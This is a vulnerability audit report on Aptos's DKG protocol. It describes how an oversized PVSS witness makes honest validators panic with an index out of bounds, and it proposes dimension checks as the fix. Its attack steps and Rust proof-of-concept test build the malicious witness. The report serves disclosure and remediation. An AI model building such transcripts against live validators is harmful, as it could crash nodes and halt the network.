# Audit Report

## Title
DKG Protocol Denial of Service via Malicious PVSS Transcript Witness Dimension Mismatch

## Summary
A malicious validator can craft a PVSS transcript containing a `HkzgWeightedElgamalWitness` with oversized `chunked_plaintexts` dimensions, causing honest validators to panic with an "index out of bounds" error during transcript verification. This breaks the Byzantine fault tolerance guarantees of the DKG protocol and can cause network-wide denial of service.

## Finding Description

The DKG (Distributed Key Generation) protocol uses PVSS (Publicly Verifiable Secret Sharing) transcripts that include zero-knowledge proofs. These proofs contain a witness structure (`HkzgWeightedElgamalWitness`) with fields `chunked_plaintexts: Vec<Vec<Vec<Scalar>>>` and `elgamal_randomness: Vec<Vec<Scalar>>`. [1](#0-0) 

When a transcript is deserialized from network data, the witness is extracted from the proof without dimension validation: [2](#0-1) 

During verification, the `msm_terms` function is called on this untrusted witness, which projects it to a `WeightedWitness`: [3](#0-2) 

This witness is then processed by the chunked ElGamal homomorphism, which iterates through `plaintext_chunks` and accesses `self.eks[i]` without bounds checking: [4](#0-3) 

**Attack Scenario:**
1. A malicious validator creates a PVSS transcript during DKG
2. In the sharing proof, they construct a `HkzgWeightedElgamalWitness` where `chunked_plaintexts` has more elements than the number of players (e.g., 100 elements when there are only 10 validators)
3. They broadcast this transcript to honest validators
4. When honest validators call `verify()` on the transcript, it deserializes the proof and calls `msm_terms(&proof.z)`
5. The iteration in line 231-238 reaches `i = 10` (beyond `eks.len()`)
6. The array access `self.eks[i]` at line 237 panics with "index out of bounds"
7. The honest validator's node crashes

The vulnerability exists because:
- No dimension validation occurs before using the witness from the deserialized proof
- The `eks` array length is determined by `sc.get_total_num_players()` during verification setup
- But `plaintext_chunks` length comes from untrusted input and can be arbitrarily large

## Impact Explanation

**Severity: High (potentially Critical)**

This vulnerability meets **High Severity** criteria per the Aptos bug bounty program:
- **Validator node crashes**: A single malicious validator can cause honest validator nodes to panic and crash during DKG transcript verification

The impact could escalate to **Critical Severity** if:
- Multiple honest validators crash simultaneously during DKG, causing the DKG process to fail
- This prevents the network from establishing the distributed key needed for epoch transitions
- Without successful DKG, the network experiences **total loss of liveness**

**Security Invariant Violations:**
1. **Consensus Safety (Byzantine Fault Tolerance)**: The system should tolerate up to f < n/3 Byzantine validators, but a single malicious validator can crash honest nodes
2. **Deterministic Execution**: Validator nodes should not crash on any valid network input; malformed inputs should be rejected gracefully

**Affected Components:**
- All validator nodes participating in DKG
- Network liveness during epoch transitions
- Consensus protocol availability

## Likelihood Explanation

**Likelihood: High**

- **Attack Complexity**: Low - the attacker only needs to modify witness dimensions in a transcript
- **Attacker Requirements**: Requires validator access, but Byzantine validators are explicitly part of the threat model
- **Detection Difficulty**: The attack is easily detectable post-exploitation (validators crash), but there's no pre-validation to prevent it
- **Reproducibility**: 100% - the panic is deterministic given malformed input

The vulnerability is highly likely to be exploited because:
1. Any single validator can become malicious (no collusion required)
2. The attack is trivial to execute once validator access is obtained
3. The impact is immediate and severe (node crashes)
4. DKG occurs during epoch transitions, a critical protocol phase

## Recommendation

Add dimension validation before processing the witness during verification. Specifically, validate that:
1. `chunked_plaintexts.len() == sc.get_total_num_players()`
2. For each player i: `chunked_plaintexts[i].len() == sc.get_player_weight(&sc.get_player(i))`
3. `elgamal_randomness.len() == sc.get_max_weight()`
4. All inner chunk vectors have consistent length equal to `num_chunks_per_scalar`

**Recommended Fix Location:**

Add validation in the `verify` function before calling `hom.verify()`: [5](#0-4) 

Insert validation checks immediately before line 178:

```rust
// Validate witness dimensions from the proof before processing
if let sigma_protocol::FirstProofItem::Commitment(_) = &self.sharing_proof.SoK.first_proof_item {
    let witness = &self.sharing_proof.SoK.z;
    
    // Validate chunked_plaintexts has correct number of players
    if witness.chunked_plaintexts.len() != sc.get_total_num_players() {
        bail!("Invalid witness: expected {} players in chunked_plaintexts, got {}", 
              sc.get_total_num_players(), witness.chunked_plaintexts.len());
    }
    
    // Validate each player's chunks match their weight
    for (player_id, player_chunks) in witness.chunked_plaintexts.iter().enumerate() {
        let expected_weight = sc.get_player_weight(&sc.get_player(player_id));
        if player_chunks.len() != expected_weight {
            bail!("Invalid witness: player {} should have {} chunks, got {}", 
                  player_id, expected_weight, player_chunks.len());
        }
    }
    
    // Validate elgamal_randomness length
    if witness.elgamal_randomness.len() != sc.get_max_weight() {
        bail!("Invalid witness: expected {} randomness vectors, got {}", 
              sc.get_max_weight(), witness.elgamal_randomness.len());
    }
}
```

## Proof of Concept

```rust
#[cfg(test)]
mod poc_dimension_mismatch_panic {
    use super::*;
    use crate::pvss::chunky::{
        hkzg_chunked_elgamal::HkzgWeightedElgamalWitness,
        weighted_transcript::Transcript,
    };
    use aptos_crypto::{
        weighted_config::WeightedConfigArkworks,
        arkworks::{shamir::ShamirThresholdConfig, random::sample_field_elements},
    };
    use ark_bn254::{Bn254, Fr};
    use rand::thread_rng;

    #[test]
    #[should_panic(expected = "index out of bounds")]
    fn test_malicious_oversized_witness_causes_panic() {
        let mut rng = thread_rng();
        
        // Setup: 3 validators, threshold 2
        let sc = WeightedConfigArkworks::<Fr>::new(2, vec![1, 1, 1]).unwrap();
        
        // Create malicious witness with MORE players than actually exist
        let malicious_witness = HkzgWeightedElgamalWitness {
            hkzg_randomness: univariate_hiding_kzg::CommitmentRandomness::rand(&mut rng),
            // MALICIOUS: Create 100 player entries instead of 3
            chunked_plaintexts: (0..100)
                .map(|_| vec![vec![Scalar(Fr::rand(&mut rng)); 16]])
                .collect(),
            elgamal_randomness: vec![vec![Scalar(Fr::rand(&mut rng)); 16]; 1],
        };
        
        // Construct a malicious proof containing this witness
        let malicious_proof = sigma_protocol::Proof {
            first_proof_item: sigma_protocol::FirstProofItem::Commitment(
                TupleCodomainShape(
                    TrivialShape(unsafe_random_point_group(&mut rng)),
                    chunked_elgamal::WeightedCodomainShape {
                        chunks: vec![vec![vec![unsafe_random_point_group(&mut rng); 16]; 1]; 3],
                        randomness: vec![vec![unsafe_random_point_group(&mut rng); 16]; 1],
                    },
                )
            ),
            z: malicious_witness,
        };
        
        // Setup verification environment
        let pp = PublicParameters::<Bn254>::default(8, 3);
        let eks: Vec<_> = (0..3).map(|_| 
            keys::EncryptPubKey { ek: unsafe_random_point_group(&mut rng) }
        ).collect();
        
        // Create homomorphism for verification with only 3 encryption keys
        let eks_inner: Vec<_> = eks.iter().map(|ek| ek.ek).collect();
        let lagr_g1 = match &pp.pk_range_proof.ck_S.msm_basis {
            SrsBasis::Lagrange { lagr: lagr_g1 } => lagr_g1,
            _ => panic!("Expected Lagrange basis"),
        };
        
        let hom = hkzg_chunked_elgamal::WeightedHomomorphism::<Bn254>::new(
            lagr_g1,
            pp.pk_range_proof.ck_S.xi_1,
            &pp.pp_elgamal,
            &eks_inner, // Only 3 keys here!
        );
        
        // When verify() calls msm_terms on the malicious witness with 100 players,
        // it will try to access self.eks[i] where i >= 3, causing a panic
        let _ = hom.verify(
            &malicious_proof.first_proof_item.unwrap_commitment(),
            &malicious_proof,
            &"test_context",
        );
        // PANIC: index out of bounds - tried to access eks[10] when eks.len() == 3
    }
}
```

**Notes:**
- The vulnerability requires validator-level access to send PVSS transcripts, but Byzantine validators are explicitly part of the BFT threat model
- The panic occurs deterministically during verification, not just probabilistically
- Similar dimension mismatches could exist for chunk counts within each player's data, though these would fail silently via `.zip()` truncation rather than panic
- The fix must occur at deserialization/verification time since witness data comes from untrusted network sources

### Citations

**File:** crates/aptos-dkg/src/pvss/chunky/hkzg_chunked_elgamal.rs (L47-51)
```rust
pub struct HkzgWeightedElgamalWitness<F: PrimeField> {
    pub hkzg_randomness: univariate_hiding_kzg::CommitmentRandomness<F>,
    pub chunked_plaintexts: Vec<Vec<Vec<Scalar<F>>>>, // For each player, plaintexts z_i, which are chunked z_{i,j}
    pub elgamal_randomness: Vec<Vec<Scalar<F>>>, // For at most max_weight, for each chunk, a blinding factor
}
```

**File:** crates/aptos-dkg/src/pvss/chunky/hkzg_chunked_elgamal.rs (L224-234)
```rust
            projection: |dom: &HkzgWeightedElgamalWitness<E::ScalarField>| {
                let HkzgWeightedElgamalWitness {
                    chunked_plaintexts,
                    elgamal_randomness,
                    ..
                } = dom;
                chunked_elgamal::WeightedWitness {
                    plaintext_chunks: chunked_plaintexts.clone(),
                    plaintext_randomness: elgamal_randomness.clone(),
                }
            },
```

**File:** crates/aptos-dkg/src/sigma_protocol/traits.rs (L342-354)
```rust
#[derive(CanonicalSerialize, Debug, CanonicalDeserialize, Clone)]
pub struct Proof<F: PrimeField, H: homomorphism::Trait>
where
    H::Domain: Witness<F>,
    H::Codomain: Statement,
{
    /// The “first item” recorded in the proof, which can be either:
    /// - the prover's commitment (H::Codomain)
    /// - the verifier's challenge (E::ScalarField)
    pub first_proof_item: FirstProofItem<F, H>,
    /// Prover's second message (response)
    pub z: H::Domain,
}
```

**File:** crates/aptos-dkg/src/pvss/chunky/chunked_elgamal.rs (L229-239)
```rust
    fn msm_terms(&self, input: &Self::Domain) -> Self::CodomainShape<Self::MsmInput> {
        // C_{i,j} = z_{i,j} * G_1 + r_j * ek[i]
        let Cs = input
            .plaintext_chunks
            .iter()
            .enumerate()
            .map(|(i, z_i)| {
                // here `i` is the player's id
                chunks_vec_msm_terms::<C>(self.pp, self.eks[i], z_i, &input.plaintext_randomness)
            })
            .collect();
```

**File:** crates/aptos-dkg/src/pvss/chunky/weighted_transcript.rs (L172-190)
```rust
            let hom = hkzg_chunked_elgamal::WeightedHomomorphism::<E>::new(
                lagr_g1,
                pp.pk_range_proof.ck_S.xi_1,
                &pp.pp_elgamal,
                &eks_inner,
            );
            if let Err(err) = hom.verify(
                &TupleCodomainShape(
                    self.sharing_proof.range_proof_commitment.clone(),
                    chunked_elgamal::WeightedCodomainShape {
                        chunks: self.subtrs.Cs.clone(),
                        randomness: self.subtrs.Rs.clone(),
                    },
                ),
                &self.sharing_proof.SoK,
                &sok_cntxt,
            ) {
                bail!("PoK verification failed: {:?}", err);
            }
```
